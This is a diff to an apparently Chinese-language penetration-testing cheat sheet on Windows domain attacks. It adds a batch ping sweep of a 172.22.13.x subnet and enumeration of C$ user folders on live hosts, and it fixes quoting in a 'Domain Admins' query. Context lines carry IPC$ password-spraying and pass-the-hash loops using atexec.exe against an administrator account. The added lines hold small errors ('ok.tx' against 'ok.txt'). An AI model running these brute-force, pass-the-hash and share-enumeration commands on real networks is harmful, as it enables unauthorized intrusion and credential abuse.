@@ -1222,7 +1222,7 @@ Nltest /DCLIST:test 查看域中域控制器名
 
 Wmic useraccount get /all 用户详细信息
 
-Net group “Domain Admins” /domain 对应组下的账户信息
+Net group "Domain Admins" /domain 对应组下的账户信息
 
 nltest /domain_trusts 获取域信任信息
 
@@ -1332,6 +1332,12 @@ FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\admin
 
 已知用户和ip，批量连接hash(爆破hash)：
 FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
+```
+精准批量法
+```
+shell for /l %i in (1,1,253) do echo 172.22.13.%i >>tip.txt
+shell for /f %i in (tip.txt) do ping -n 1 -w 10 %i | find /i "ttl" >nul && echo %%i >>ok.tx
+shell for /f %i in (ok.txt) do dir \\%i\c$\users >>result.txt
 ```
 
 cme 批量
